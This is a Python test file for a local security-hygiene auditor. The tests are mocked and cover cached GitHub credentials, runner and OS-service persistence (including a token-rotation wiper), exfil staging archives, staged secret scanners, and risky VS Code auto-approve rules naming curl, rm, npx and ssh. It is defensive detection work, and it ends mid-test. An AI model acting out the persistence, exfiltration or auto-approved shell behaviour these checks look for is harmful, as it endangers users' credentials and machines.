#!/usr/bin/env python3
"""Local machine hygiene checks (credentials + VS Code), all mocked — no real probing."""
from __future__ import annotations

import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from stayawake.bots.security.guard import GateProbe  # noqa: E402
from stayawake.bots.security import hygiene


class TestCredentials(unittest.TestCase):
    def _keychain(self, *, served=False, ssh=True, gh=True, origins=None, store=None):
        """check_credentials() with the keychain hit and the given machine shape (#1237/#1260). `served`
        is the tri-state HTTPS-in-use probe: True (in use) | False (unused) | None (couldn't probe).
        `store` selects the platform's OS keychain (default: macOS) — mocked at `_detect_cached_credential`
        so the test is independent of the host it runs on."""
        C = hygiene.credentials
        origins = origins if origins is not None else [("file:/Users/u/.gitconfig", "osxkeychain")]
        with mock.patch.object(C, "_detect_cached_credential", return_value=store or C._MACOS_STORE), \
             mock.patch.object(C, "_git_credentials_file_with_github", return_value=None), \
             mock.patch.object(C, "_https_token_status", return_value=served), \
             mock.patch.object(C, "_ssh_key_present", return_value=ssh), \
             mock.patch.object(C, "_gh_configured", return_value=gh), \
             mock.patch.object(C, "_credential_helper_origins", return_value=origins):
            return next(i for i in hygiene.check_credentials() if i.id == "cached-github-keychain")

    def test_keychain_hit_is_info_not_warning(self):
        # #1237: a token in the ENCRYPTED keychain is normal — a review item, not a warning to act on.
        f = self._keychain()
        self.assertEqual(f.severity, "info")
        self.assertEqual(f.reference, hygiene.credentials.CREDENTIAL_HYGIENE_DOC)

    def test_keychain_finding_is_property_framed_and_names_the_store(self):
        f = self._keychain()
        self.assertIn("lifetime", f.detail.lower())
        self.assertIn("scope", f.detail.lower())
        # names the store + scopes the claim: gh / SSH are separate and untouched
        self.assertIn("SEPARATE stores", f.detail)
        self.assertRegex(f.detail.lower(), r"gh.*ssh|ssh.*gh")

    def test_keychain_never_in_the_exposure_banner(self):
        # A lone cached keychain token must NOT trigger the credential-exposure banner (it's not an
        # incident) — only a real misconfiguration (plaintext on disk) does.
        self.assertNotIn("cached-github-keychain", hygiene.CREDENTIAL_EXPOSURE_IDS)
        out = hygiene.render([self._keychain()])
        self.assertNotIn("Credential exposure", out)
        self.assertNotIn("no active host persistence", out.lower())

    def test_unused_token_offers_a_lockout_safe_verified_command(self):
        # served=False → removal candidate. The command must LEAD with an `ssh -T` alternate-path check
        # (so a wrong guess can't silently lock you out), then resolve source + delete + re-probe.
        f = self._keychain(served=False, ssh=True, gh=True)
        self.assertIn("removal candidate", f.detail)
        cmd_lines = f.command.splitlines()
        self.assertIn("ssh -T git@github.com", cmd_lines[0])     # STEP 1 is the alternate-path check
        self.assertIn("STOP if it doesn't", cmd_lines[0])
        self.assertIn("git config --show-origin", f.command)     # resolves the REAL source
        self.assertIn("git credential fill", f.command)          # re-probes to VERIFY caching stopped

    def test_served_token_is_never_offered_a_delete(self):
        # HTTPS is IN USE here → deleting logs you out regardless of any 'alternate' → NEVER offer a
        # delete (this is the lockout guard, and it no longer depends on ssh/gh being accurate).
        for ssh, gh in [(False, False), (True, False), (False, True), (True, True)]:
            f = self._keychain(served=True, ssh=ssh, gh=gh)
            self.assertIsNone(f.command, f"delete offered with ssh={ssh} gh={gh} while HTTPS in use")
            self.assertIn("IN USE", f.detail)
            self.assertIn("don't delete this token", f.remediation)

    def test_unknown_probe_stays_cautious_but_verified(self):
        # served=None (couldn't probe) → don't assert 'unused'; still offer the ssh-T-guarded sequence.
        f = self._keychain(served=None, ssh=False, gh=False)
        self.assertIn("Couldn't determine", f.detail)
        self.assertIn("ssh -T git@github.com", f.command.splitlines()[0])

    def test_system_default_origin_uses_add_reset_not_unset(self):
        # AC4: an inherited read-only system default (Apple CommandLineTools) can't be --unset; the
        # command must reset it with `--add credential.helper ""`.
        clt = [("file:/Library/Developer/CommandLineTools/usr/share/git-core/gitconfig", "osxkeychain")]
        f = self._keychain(served=False, ssh=True, origins=clt)
        self.assertIn('--add credential.helper ""', f.command)
        self.assertIn("CommandLineTools", f.command)

    def test_user_config_origin_does_not_force_add_reset(self):
        f = self._keychain(served=False, ssh=True,
                           origins=[("file:/Users/u/.gitconfig", "osxkeychain")])
        self.assertNotIn('--add credential.helper ""', f.command)

    def test_user_library_path_not_misread_as_system_default(self):
        # Regression: `~/Library/...` (a USER path) must NOT be classified a read-only system default
        # just because it contains "/Library/". Anchored prefixes, not loose substrings.
        f = self._keychain(served=False, ssh=True,
                           origins=[("file:/Users/u/Library/Application Support/Fork/gitconfig",
                                     "osxkeychain")])
        self.assertNotIn('--add credential.helper ""', f.command)

    def test_clean_machine_has_no_credential_issues(self):
        with mock.patch.object(hygiene.credentials, "_detect_cached_credential", return_value=None), \
             mock.patch.object(hygiene.credentials, "_git_credentials_file_with_github", return_value=None):
            self.assertEqual(hygiene.check_credentials(), [])

    def test_plaintext_git_credentials_detected(self):
        with tempfile.TemporaryDirectory() as d:
            cred = Path(d) / ".git-credentials"
            cred.write_text("https://x:token@github.com\n", encoding="utf-8")
            with mock.patch.object(hygiene.Path, "home", return_value=Path(d)):
                self.assertEqual(hygiene.credentials._git_credentials_file_with_github(), cred)

    def test_plaintext_remediation_is_wiper_safe(self):
        # The rotation advice must sequence rotation LAST and name the wiper tripwire —
        # never the old unconditional "rotate the exposed token on GitHub" (#1088).
        with mock.patch.object(hygiene.credentials, "_detect_cached_credential", return_value=None), \
             mock.patch.object(hygiene.credentials, "_git_credentials_file_with_github",
                               return_value=Path("/home/u/.git-credentials")):
            issues = hygiene.check_credentials()
        rem = next(i.remediation for i in issues if i.id == "git-credentials-plaintext")
        self.assertIn("gh-token-monitor.service", rem)          # names the wiper tripwire
        self.assertIn("Rotate the exposed token LAST", rem)     # rotation is sequenced last
        self.assertNotIn("rotate the exposed token on GitHub", rem)  # old unsafe wording gone

    # --- cross-platform detection (#1260) ---------------------------------------------------------
    def _detect(self, platform, *, mac=False, lin=False, win=False):
        C = hygiene.credentials
        with mock.patch.object(C.sys, "platform", platform), \
             mock.patch.object(C, "_macos_keychain_has_github", return_value=mac), \
             mock.patch.object(C, "_linux_secret_has_github", return_value=lin), \
             mock.patch.object(C, "_windows_credential_has_github", return_value=win):
            return C._detect_cached_credential()

    def test_detect_dispatches_to_the_right_store_per_platform(self):
        C = hygiene.credentials
        self.assertIs(self._detect("darwin", mac=True), C._MACOS_STORE)
        self.assertIs(self._detect("linux", lin=True), C._LINUX_STORE)
        self.assertIs(self._detect("win32", win=True), C._WINDOWS_STORE)

    def test_detect_returns_none_when_the_store_is_empty(self):
        self.assertIsNone(self._detect("darwin", mac=False))
        self.assertIsNone(self._detect("linux", lin=False))
        self.assertIsNone(self._detect("win32", win=False))

    def test_detect_unknown_platform_is_none(self):
        # An unsupported platform (or one whose store CLI is absent) reports nothing, never errors.
        self.assertIsNone(self._detect("freebsd", mac=True, lin=True, win=True))

    def test_linux_probe_never_captures_the_secret(self):
        # SAFETY (#1260): libsecret's query verbs load the secret, so the Linux probe must run with
        # output DISCARDED (capture=False) and read presence from the exit code — saw never holds the
        # token. Lock both the discard and the rc-only detection.
        C = hygiene.credentials
        with mock.patch.object(C, "_run", return_value=mock.Mock(returncode=0)) as run:
            self.assertTrue(C._linux_secret_has_github())
        self.assertEqual(run.call_args.kwargs.get("capture"), False)   # secret discarded, not captured
        self.assertIn("lookup", run.call_args.args[0])                 # rc-based lookup, not printing search
        with mock.patch.object(C, "_run", return_value=mock.Mock(returncode=1)):
            self.assertFalse(C._linux_secret_has_github())             # rc!=0 → absent

    def test_linux_finding_names_store_and_uses_libsecret_removal(self):
        f = self._keychain(served=False, ssh=True, store=hygiene.credentials._LINUX_STORE,
                           origins=[("file:/home/u/.gitconfig", "libsecret")])
        self.assertIn("libsecret", f.title)
        self.assertIn("secret-tool clear server github.com", f.command)
        self.assertNotIn("security delete-internet-password", f.command)   # not the macOS command

    def test_windows_finding_names_store_and_uses_cmdkey_removal(self):
        f = self._keychain(served=False, ssh=True, store=hygiene.credentials._WINDOWS_STORE,
                           origins=[("file:C:/Users/u/.gitconfig", "manager")])
        self.assertIn("Windows Credential Manager", f.title)
        self.assertIn("cmdkey /delete:git:https://github.com", f.command)

    def test_served_token_never_offers_delete_on_any_platform(self):
        # The lockout guard is platform-independent: HTTPS in use → no delete, whatever the store.
        for store in (hygiene.credentials._MACOS_STORE, hygiene.credentials._LINUX_STORE,
                      hygiene.credentials._WINDOWS_STORE):
            f = self._keychain(served=True, ssh=False, gh=False, store=store)
            self.assertIsNone(f.command)


class TestRunnerPersistence(unittest.TestCase):
    def test_installed_runner_is_a_warning(self):
        with mock.patch.object(hygiene.runner, "_installed_runner_dir",
                               return_value=Path("/home/u/actions-runner")), \
             mock.patch.object(hygiene.runner, "_runner_services", return_value=[]):
            issues = hygiene.check_runner_persistence()
        self.assertIn("self-hosted-runner-persistence", [i.id for i in issues])
        self.assertTrue(all(i.severity == "warning" for i in issues))

    def test_registered_service_alone_is_detected(self):
        with mock.patch.object(hygiene.runner, "_installed_runner_dir", return_value=None), \
             mock.patch.object(hygiene.runner, "_runner_services",
                               return_value=["actions.runner.org-repo.host"]):
            ids = [i.id for i in hygiene.check_runner_persistence()]
        self.assertEqual(ids, ["self-hosted-runner-persistence"])

    def test_remediation_is_wiper_safe(self):
        # Must sequence rotation LAST and never tell the user to rotate first — rotating while
        # runner persistence is live can trip the home-dir wiper (#1088 ordering).
        with mock.patch.object(hygiene.runner, "_installed_runner_dir",
                               return_value=Path("/home/u/actions-runner")), \
             mock.patch.object(hygiene.runner, "_runner_services", return_value=[]):
            issues = hygiene.check_runner_persistence()
        self.assertEqual({"self-hosted-runner-persistence"}, {i.id for i in issues})
        for i in issues:
            rem = i.remediation.lower()
            self.assertIn("do not rotate credentials", rem)          # leads with the guardrail
            self.assertIn("rotate credentials last", rem)
            # The rotation ACTION (the LAST 'rotate' — not the "Do NOT rotate" guardrail) is
            # sequenced AFTER isolation: a meaningful ordering check, not a phrase that never appears.
            self.assertLess(rem.index("isolate the host"), rem.rindex("rotate"))

    def test_macos_launchd_runner_is_captured(self):
        # The launchd branch collects actions.runner labels; the wiper is NOT a runner (it's owned
        # by check_persistence), so _runner_services stays runner-only.
        def fake_run(cmd, **kw):
            if cmd[0] == "launchctl":
                return mock.Mock(returncode=0,
                                 stdout="-\t0\tgh-token-monitor\n"
                                        "501\t0\tactions.runner.acme-app.buildbox\n")
            raise FileNotFoundError                       # no systemctl on macOS
        with mock.patch.object(hygiene.subprocess, "run", side_effect=fake_run):
            services = hygiene.runner._runner_services()
        self.assertIn("actions.runner.acme-app.buildbox", services)
        self.assertNotIn("gh-token-monitor", services)    # wiper is not a runner label

    def test_runner_label_matcher_precision(self):
        # A runner label matches; an unrelated label that merely CONTAINS "actions.runner"
        # (a third-party helper) must NOT — the old whole-line substring test over-matched.
        self.assertTrue(hygiene.runner._is_runner_label("actions.runner.acme-app.host"))
        self.assertFalse(hygiene.runner._is_runner_label("gh-token-monitor.service"))
        self.assertFalse(hygiene.runner._is_runner_label("com.vendor.actions.runner-helper"))
        self.assertFalse(hygiene.runner._is_runner_label("com.apple.Spotlight"))

    def test_clean_host_has_no_runner_issue(self):
        with mock.patch.object(hygiene.runner, "_installed_runner_dir", return_value=None), \
             mock.patch.object(hygiene.runner, "_runner_services", return_value=[]):
            self.assertEqual(hygiene.check_runner_persistence(), [])

    def test_runner_persistence_triggers_incident_runbook(self):
        # Host persistence is an INCIDENT_TRIGGER, so render() must lead with the rotate-LAST
        # runbook (a user's reflex on seeing a rogue runner is to rotate — the wiper tripwire).
        issue = hygiene.HygieneIssue("self-hosted-runner-persistence", "warning", "T", "D", "F")
        out = hygiene.render([issue]).lower()
        self.assertIn("rotate last", out)
        self.assertLess(out.index("isolate the host"), out.index("rotate credentials"))

    def test_audit_composes_runner_persistence(self):
        # Regression: audit() is the SINGLE composition site and must include every probe,
        # so a probe added there is never silently dropped by a caller that hand-assembles checks.
        sentinel = hygiene.HygieneIssue("self-hosted-runner-persistence", "warning", "T", "D", "F")
        with mock.patch.object(hygiene, "check_credentials", return_value=[]), \
             mock.patch.object(hygiene, "check_vscode", return_value=[]), \
             mock.patch.object(hygiene, "check_branch_protection", return_value=[]), \
             mock.patch.object(hygiene, "check_persistence", return_value=[]), \
             mock.patch.object(hygiene, "check_runner_persistence", return_value=[sentinel]):
            ids = [i.id for i in hygiene.audit()]
        self.assertIn("self-hosted-runner-persistence", ids)


class TestPersistence(unittest.TestCase):
    """OS-service persistence probe (#1094) — the gh-token-monitor rotation wiper + lookalikes,
    across systemd unit dirs and macOS LaunchAgents/LaunchDaemons. Uses a tempdir as $HOME so no
    real filesystem outside the tempdir is touched (system dirs like /etc are absent → skipped)."""

    def _home_with(self, rel_files):
        d = Path(tempfile.mkdtemp())
        for rel in rel_files:
            p = d / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text("", encoding="utf-8")
        return d

    def test_linux_user_unit_named_hit_warns(self):
        d = self._home_with([".config/systemd/user/gh-token-monitor.service"])
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            issues = hygiene.check_persistence()
        self.assertEqual([i.id for i in issues], ["os-service-persistence"])
        self.assertEqual(issues[0].severity, "warning")
        self.assertIn("gh-token-monitor.service", issues[0].detail)

    def test_macos_launchagent_hit_warns(self):
        d = self._home_with(["Library/LaunchAgents/com.gh-token-monitor.plist"])
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            ids = [i.id for i in hygiene.check_persistence()]
        self.assertEqual(ids, ["os-service-persistence"])

    def test_lookalike_name_is_detected(self):
        # A lookalike (pattern, not the exact name) still warns given the wiper stakes.
        d = self._home_with([".config/systemd/user/gh-token-watch.service"])
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            issues = hygiene.check_persistence()
        self.assertEqual([i.id for i in issues], ["os-service-persistence"])
        self.assertIn("lookalike", issues[0].detail.lower())

    def test_unrelated_units_are_clean(self):
        d = self._home_with([".config/systemd/user/pipewire.service",
                             "Library/LaunchAgents/com.apple.something.plist"])
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_persistence(), [])

    def test_absent_dirs_are_a_noop(self):
        d = Path(tempfile.mkdtemp())          # empty $HOME, no service dirs at all
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            self.assertEqual(hygiene.check_persistence(), [])

    def test_remediation_sequences_isolate_before_rotate(self):
        d = self._home_with([".config/systemd/user/gh-token-monitor.service"])
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            rem = hygiene.check_persistence()[0].remediation.lower()
        self.assertIn("do not rotate", rem)
        self.assertLess(rem.index("isolate"), rem.rindex("rotate"))   # isolate before rotation action

    def test_os_service_persistence_triggers_incident_runbook(self):
        issue = hygiene.HygieneIssue("os-service-persistence", "warning", "T", "D", "F")
        out = hygiene.render([issue]).lower()
        self.assertIn("rotate last", out)
        self.assertLess(out.index("isolate the host"), out.index("rotate credentials"))

    def test_audit_composes_persistence(self):
        sentinel = hygiene.HygieneIssue("os-service-persistence", "warning", "T", "D", "F")
        with mock.patch.object(hygiene, "check_credentials", return_value=[]), \
             mock.patch.object(hygiene, "check_vscode", return_value=[]), \
             mock.patch.object(hygiene, "check_branch_protection", return_value=[]), \
             mock.patch.object(hygiene, "check_runner_persistence", return_value=[]), \
             mock.patch.object(hygiene, "check_persistence", return_value=[sentinel]):
            ids = [i.id for i in hygiene.audit()]
        self.assertIn("os-service-persistence", ids)


class TestHostArtifacts(unittest.TestCase):
    """Host filesystem drop-file probe (#1100) — ingress tooling / staged data. FP-bounded: a lone
    weak indicator is info, a strong/corroborated set is a warning; both point to rotate-LAST."""

    # ── severity / remediation logic (mock the probe to control the artifact set) ──
    def test_lone_weak_indicator_is_info(self):
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts", return_value=([], [("~/.node_modules", Path("~/.node_modules"))])):
            issues = hygiene.check_host_artifacts()
        self.assertEqual([(i.id, i.severity) for i in issues], [("host-drop-artifact-weak", "info")])

    def test_weak_indicator_language_is_not_accusatory(self):
        # Honesty (#1220): a lone WEAK indicator must not be described as a "payload" or accuse
        # compromise — existence alone can't tell worm-staging from a manual npm install.
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts", return_value=([], [("~/.node_modules", Path("~/.node_modules"))])):
            f = hygiene.check_host_artifacts()[0]
        self.assertEqual(f.severity, "info")
        self.assertNotIn("payload", (f.title + " " + f.detail).lower())   # no "payload-created" accusation
        self.assertIn("weak", f.detail.lower())                            # honest about the confidence

    def test_strong_ioc_is_warning(self):
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts",
                               return_value=(["host$user exfil archive"], [])):
            issues = hygiene.check_host_artifacts()
        self.assertEqual([(i.id, i.severity) for i in issues], [("host-drop-artifacts", "warning")])

    def test_two_weak_indicators_corroborate_to_warning(self):
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts",
                               return_value=([], [("~/.node_modules", Path("~/.node_modules")),
                                                  ("/tmp/.npm", Path("/tmp/.npm"))])):
            issues = hygiene.check_host_artifacts()
        self.assertEqual([i.severity for i in issues], ["warning"])

    def test_clean_host_has_no_issue(self):
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts", return_value=([], [])):
            self.assertEqual(hygiene.check_host_artifacts(), [])

    def test_remediation_is_rotate_last(self):
        for probe in (([], [("~/.node_modules", Path("~/.node_modules"))]), (["host$user archive"], [])):
            with mock.patch.object(hygiene.host_artifacts, "_host_artifacts", return_value=probe):
                rem = hygiene.check_host_artifacts()[0].remediation.lower()
            # Rotation is sequenced last / after isolation (warning says "LAST"; info "BEFORE
            # rotating") — and the rotation ACTION comes after "isolate", not before it.
            self.assertTrue("rotate credentials last" in rem or "before rotating" in rem)
            self.assertLess(rem.index("isolate"), rem.rindex("rotat"))

    def test_warning_triggers_incident_runbook_but_info_does_not(self):
        warn = hygiene.HygieneIssue("host-drop-artifacts", "warning", "T", "D", "F")
        info = hygiene.HygieneIssue("host-drop-artifact-weak", "info", "T", "D", "F")
        self.assertIn("respond in this order", hygiene.render([warn]).lower())
        self.assertNotIn("respond in this order", hygiene.render([info]).lower())

    # ── detection against a fake $HOME ─────────────────────────────────────────────
    def test_detects_node_modules_as_weak(self):
        d = Path(tempfile.mkdtemp())
        (d / ".node_modules").mkdir()
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            strong, weak = hygiene.host_artifacts._host_artifacts()
        self.assertTrue(any(".node_modules" in desc for desc, _ in weak))
        self.assertEqual(strong, [])

    def test_detects_host_user_exfil_archive_as_strong(self):
        d = Path(tempfile.mkdtemp())
        tag = hygiene.host_artifacts._host_user_tag()
        (d / (tag + ".tar.gz")).write_text("x", encoding="utf-8")
        with mock.patch.object(hygiene.Path, "home", return_value=d):
            strong, _ = hygiene.host_artifacts._host_artifacts()
        self.assertTrue(any("exfil staging archive" in s for s in strong))

    def test_trufflehog_dir_is_not_flagged_but_binary_is(self):
        # A trufflehog CACHE DIR (legit user) must not hit; a staged trufflehog FILE must.
        d = Path(tempfile.mkdtemp())
        (d / ".cache").mkdir()
        (d / ".cache" / "trufflehog").mkdir()          # legit cache dir
        self.assertIsNone(hygiene.host_artifacts._staged_secret_scanner((d / ".cache",)))
        (d / ".npm").mkdir()
        (d / ".npm" / "trufflehog").write_text("bin", encoding="utf-8")   # staged binary FILE
        self.assertIsNotNone(hygiene.host_artifacts._staged_secret_scanner((d / ".npm",)))

    def test_audit_composes_host_artifacts(self):
        sentinel = hygiene.HygieneIssue("host-drop-artifacts", "warning", "T", "D", "F")
        with mock.patch.object(hygiene, "check_credentials", return_value=[]), \
             mock.patch.object(hygiene, "check_vscode", return_value=[]), \
             mock.patch.object(hygiene, "check_runner_persistence", return_value=[]), \
             mock.patch.object(hygiene, "check_persistence", return_value=[]), \
             mock.patch.object(hygiene, "check_branch_protection", return_value=[]), \
             mock.patch.object(hygiene, "check_host_artifacts", return_value=[sentinel]):
            ids = [i.id for i in hygiene.audit()]
        self.assertIn("host-drop-artifacts", ids)


class TestVerifyArtifactsOptIn(unittest.TestCase):
    """`--verify-artifacts` (#1221): content-scan a lone weak DIR to turn it into a real verdict.
    `saw scan` is untouched — this only changes how the audit GRADES a weak host artifact. verify_dir
    is mocked here (its own engine behaviour is covered in test_verify.py); these pin the wiring."""

    def _weak_dir_probe(self):
        d = Path(tempfile.mkdtemp())          # a real dir so path.is_dir() is True
        return d, ([], [(f"{d} (an npm tree — unusual location)", d)])

    def test_default_audit_does_not_scan(self):
        # Without the flag the weak dir stays the honest info and verify_dir is NEVER called.
        _, probe = self._weak_dir_probe()
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts", return_value=probe), \
             mock.patch("stayawake.bots.security.verify.verify_dir") as vd:
            issues = hygiene.check_host_artifacts(verify=False)
        vd.assert_not_called()
        self.assertEqual([(i.id, i.severity) for i in issues], [("host-drop-artifact-weak", "info")])

    def test_markers_found_escalates_to_warning(self):
        from stayawake.bots.security.verify import DirVerdict
        d, probe = self._weak_dir_probe()
        verdict = DirVerdict(path=str(d), files=6, markers=["loader-fromcharcode-127"])
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts", return_value=probe), \
             mock.patch("stayawake.bots.security.verify.verify_dir", return_value=verdict):
            issues = hygiene.check_host_artifacts(verify=True)
        self.assertEqual([(i.id, i.severity) for i in issues],
                         [("host-artifact-content-infected", "warning")])
        self.assertIn("loader-fromcharcode-127", issues[0].detail)

    def test_markers_found_triggers_incident_runbook(self):
        # host-artifact-content-infected is ACTIVE persistence → the rotate-LAST runbook leads.
        out = hygiene.render([hygiene.HygieneIssue("host-artifact-content-infected", "warning",
                                                   "T", "D", "F")]).lower()
        self.assertIn("respond in this order", out)

    def test_scanned_clean_is_reassuring_info(self):
        from stayawake.bots.security.verify import DirVerdict
        d, probe = self._weak_dir_probe()
        verdict = DirVerdict(path=str(d), files=120, scanned_clean=True)
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts", return_value=probe), \
             mock.patch("stayawake.bots.security.verify.verify_dir", return_value=verdict):
            issues = hygiene.check_host_artifacts(verify=True)
        self.assertEqual([(i.id, i.severity) for i in issues],
                         [("host-artifact-scanned-clean", "info")])
        self.assertIn("no confirmed malware markers", issues[0].detail.lower())

    def test_too_large_stays_honest_never_claims_clean(self):
        from stayawake.bots.security.verify import DirVerdict
        d, probe = self._weak_dir_probe()
        verdict = DirVerdict(path=str(d), too_large=True)
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts", return_value=probe), \
             mock.patch("stayawake.bots.security.verify.verify_dir", return_value=verdict):
            issues = hygiene.check_host_artifacts(verify=True)
        self.assertEqual([i.id for i in issues], ["host-drop-artifact-weak"])
        self.assertNotIn("no confirmed malware markers", issues[0].detail.lower())

    def test_read_gap_stays_honest(self):
        from stayawake.bots.security.verify import DirVerdict
        d, probe = self._weak_dir_probe()
        verdict = DirVerdict(path=str(d), error="unreadable")
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts", return_value=probe), \
             mock.patch("stayawake.bots.security.verify.verify_dir", return_value=verdict):
            issues = hygiene.check_host_artifacts(verify=True)
        self.assertEqual([i.id for i in issues], ["host-drop-artifact-weak"])

    def test_partial_coverage_stays_honest_not_clean(self):
        # A tree we walked but could NOT fully read (oversize file / escaping symlink) must fall to
        # the honest 'verify it yourself', never the reassuring scanned-clean note.
        from stayawake.bots.security.verify import DirVerdict
        d, probe = self._weak_dir_probe()
        verdict = DirVerdict(path=str(d), files=50, partial=True)
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts", return_value=probe), \
             mock.patch("stayawake.bots.security.verify.verify_dir", return_value=verdict):
            issues = hygiene.check_host_artifacts(verify=True)
        self.assertEqual([i.id for i in issues], ["host-drop-artifact-weak"])
        self.assertNotIn("no confirmed malware markers", issues[0].detail.lower())
        self.assertIn("could not be read", issues[0].detail.lower())

    def test_a_lone_weak_file_is_not_scanned(self):
        # get-pip.py is a FILE, not a dir → can't content-scan → honest info; verify_dir not called.
        f = Path(tempfile.mkdtemp()) / "get-pip.py"
        f.write_text("x", encoding="utf-8")
        with mock.patch.object(hygiene.host_artifacts, "_host_artifacts",
                               return_value=([], [(str(f), f)])), \
             mock.patch("stayawake.bots.security.verify.verify_dir") as vd:
            issues = hygiene.check_host_artifacts(verify=True)
        vd.assert_not_called()
        self.assertEqual([i.id for i in issues], ["host-drop-artifact-weak"])


class TestVSCode(unittest.TestCase):
    def _settings(self, body: str) -> Path:
        f = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
        f.write(body)
        f.close()
        return Path(f.name)

    def test_autotasks_on_is_warning(self):
        p = self._settings('{ "task.allowAutomaticTasks": "on" }')
        ids = [i.id for i in hygiene.check_vscode(p)]
        self.assertIn("vscode-autotasks-on", ids)

    def test_autotasks_off_is_clean(self):
        p = self._settings('{ "task.allowAutomaticTasks": "off" }')
        self.assertEqual(hygiene.check_vscode(p), [])

    def test_missing_setting_is_info(self):
        p = self._settings('{ "editor.fontSize": 13 }')
        issues = hygiene.check_vscode(p)
        self.assertEqual([i.id for i in issues], ["vscode-autotasks-default"])
        self.assertEqual(issues[0].severity, "info")

    def test_workspace_trust_disabled_is_warning(self):
        p = self._settings('{ "task.allowAutomaticTasks": "off", '
                           '"security.workspace.trust.enabled": false }')
        ids = [i.id for i in hygiene.check_vscode(p)]
        self.assertIn("vscode-workspace-trust-off", ids)

    def test_no_vscode_settings_is_noop(self):
        # No path given → auto-detect; when VS Code isn't installed it returns None.
        with mock.patch.object(hygiene.editor, "_vscode_user_settings", return_value=None):
            self.assertEqual(hygiene.check_vscode(), [])

    def test_untrusted_files_open_is_warning(self):
        p = self._settings('{ "task.allowAutomaticTasks": "off", '
                           '"security.workspace.trust.untrustedFiles": "open" }')
        issue = next(i for i in hygiene.check_vscode(p) if i.id == "vscode-untrusted-files-open")
        self.assertEqual(issue.severity, "warning")

    def test_risky_autoapprove_entries_flagged(self):
        p = self._settings('{ "task.allowAutomaticTasks": "off", '
                           '"chat.tools.terminal.autoApprove": { "npx": true, "ssh": true, '
                           '"echo": true } }')
        issue = next(i for i in hygiene.check_vscode(p) if i.id == "vscode-autoapprove-risky")
        self.assertEqual(issue.severity, "warning")
        self.assertIn("npx", issue.detail)
        self.assertIn("ssh", issue.detail)
        self.assertNotIn("echo", issue.detail)                  # benign command isn't flagged

    def test_autoapprove_denied_entry_not_flagged(self):
        # A risky command explicitly set to false (a deny) must NOT trip the warning.
        p = self._settings('{ "task.allowAutomaticTasks": "off", '
                           '"chat.tools.terminal.autoApprove": { "npx": false } }')
        self.assertNotIn("vscode-autoapprove-risky", [i.id for i in hygiene.check_vscode(p)])

    def test_autoapprove_blanket_true_is_flagged(self):
        # The single most dangerous form — approve EVERYTHING — must be caught (a naive object-only
        # probe misses it entirely).
        p = self._settings('{ "task.allowAutomaticTasks": "off", '
                           '"chat.tools.terminal.autoApprove": true }')
        self.assertIn("vscode-autoapprove-all", [i.id for i in hygiene.check_vscode(p)])

    def test_autoapprove_nested_object_sibling_does_not_hide_risky_booleans(self):
        # Regression: a non-greedy regex truncates at the first `}`; an object-valued sibling must NOT
        # hide `"rm": true` / `"curl": true` that follow it (balanced-brace extraction).
        p = self._settings('{ "task.allowAutomaticTasks": "off", '
                           '"chat.tools.terminal.autoApprove": { '
                           '"/^git (status|log)/": { "approve": true }, '
                           '"rm": true, "curl": true } }')
        issue = next(i for i in hygiene.check_vscode(p) if i.id == "vscode-autoapprove-risky")
        self.assertIn("rm", issue.detail)
        self.assertIn("curl", issue.detail)

    def test_autoapprove_object_form_approve_true_is_flagged(self):
        p = self._settings('{ "task.allowAutomaticTasks": "off", '
                           '"chat.tools.terminal.autoApprove": { "npx": { "approve": true } } }')
        issue = next(i for i in hygiene.check_vscode(p) if i.id == "vscode-autoapprove-risky")
        self.assertIn("npx", issue.detail)

    def test_autoapprove_catchall_regex_key_is_approve_all(self):
        # A catch-all regex key approves EVERYTHING — must escalate to the approve-all finding, not slip
        # through because the key text contains no literal risky command name.
        for key in ('"/.*/"', '"/^/"', '"//"'):
            p = self._settings('{ "task.allowAutomaticTasks": "off", '
                               '"chat.tools.terminal.autoApprove": { ' + key + ': true } }')
            self.assertIn("vscode-autoapprove-all", [i.id for i in hygiene.check_vscode(p)],
                          f"catch-all key {key} not treated as approve-all")

    def test_autoapprove_scoped_regex_is_not_approve_all(self):
        # A SCOPED regex (only git commands) must NOT be mistaken for approve-everything.
        p = self._settings('{ "task.allowAutomaticTasks": "off", '
                           '"chat.tools.terminal.autoApprove": { "/^git /": true } }')
        self.assertNotIn("vscode-autoapprove-all", [i.id for i in hygiene.check_vscode(p)])

    def test_autoapprove_brace_inside_key_does_not_hide_entries(self):
        # Regression: an unmatched brace inside a quoted key must not unbalance the extractor and hide
        # a real risky approval (string-aware brace matching).
        p = self._settings('{ "task.allowAutomaticTasks": "off", '
                           '"chat.tools.terminal.autoApprove": { "rm {": true, "curl": true } }')
        issue = next(i for i in hygiene.check_vscode(p) if i.id == "vscode-autoapprove-risky")
        self.assertIn("curl", issue.detail)

    def test_no_autoapprove_block_is_clean(self):
        p = self._settings('{ "task.allowAutomaticTasks": "off" }')
        self.assertNotIn("vscode-autoapprove-risky", [i.id for i in hygiene.check_vscode(p)])


class TestSSHAuthorizedKeys(unittest.TestCase):
    """~/.ssh/authorized_keys — the SSH-persistence sink GhostApproval writes to (#1161)."""

    def _home(self, authkeys: str | None = None, dir_mode=0o700, file_mode=0o600):
        d = Path(tempfile.mkdtemp())
        ssh = d / ".ssh"
        ssh.mkdir()
        os.chmod(ssh, dir_mode)
        if authkeys is not None:
            ak = ssh / "authorized_keys"
            ak.write_text(authkeys, encoding="utf-8")
            os.chmod(ak, file_mode)
        return d

    def test_world_writable_ssh_dir_warns(self):
        d = self._home(dir_mode=0o707)
